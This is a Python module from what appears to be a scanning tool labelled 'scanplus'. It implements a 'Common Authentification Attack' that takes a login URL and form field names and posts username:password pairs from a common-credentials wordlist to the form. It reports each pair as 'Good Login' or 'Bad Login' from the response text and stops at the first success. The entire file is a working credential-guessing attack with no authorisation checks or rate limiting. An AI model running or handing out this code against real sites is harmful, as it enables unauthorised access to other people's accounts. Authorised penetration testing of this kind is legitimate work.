import requests
from .some_function import *
import os



def test_if_user_and_passw_are_good(url, username, password, submit, error):
    userPass = os.getcwd() + "/core/wordlist/commonuserpass.txt"
    with open(userPass, "r") as up:
        liste = up.readlines()
        k = 0
        for l in liste:
            data = l.split("\n")[0]
            user = data.split(":")[0]
            passw = data.split(":")[1]
            headers = {'User-Agent': 'Mozilla/5.0'}
            payload = {username: user, password: passw, submit: "Ok"}
            link = url
            session = requests.Session()
            try:
                resp = session.get(link, headers=headers)
            except Exception as e:
                print(e)
            cookies = requests.utils.cookiejar_from_dict(requests.utils.dict_from_cookiejar(session.cookies))
            #print(cookies)
            try:
                resp = session.post(link, headers=headers, data=payload, cookies=cookies)
            except Exception as e:
                print(e)
            #print(resp.headers)
            if resp.status_code == 200:
                k = k + 1
                if error in resp.text:
                    print_red_bold("login-{} : username = {} || password = {} =====>>>>> Bad Login".format(k, user, passw))
                else:
                    print_green("login-{} : username = {} || password = {} =====>>>>> Good Login".format(k, user, passw))
                    break
            else:
                print_green("Check your connection settings")
                break








def CommonAuth():
    print_blue("\n\n===============================================================================================")
    print_blue("You have choisen Common Authentification Attack")

    print("\nEnter your url login ex: https://example.com/login")
    url = input("scanplus> url >> ")

    print("\nEnter the name of Username parameter. ex: user")
    username = input("scanplus> username >> ")

    print("\nEnter the name of your password parameter. ex: pass")
    password = input("scanplus> password >> ")


    print("\nEnter the error result. ex: Identifiants invalides.")
    error = input("scanplus> error >> ")

    print("\nEnter the name of your submit parameter. ex: submit")
    submit = input("scanplus> submit >> ")

    test_if_user_and_passw_are_good(url, username, password, submit, error)
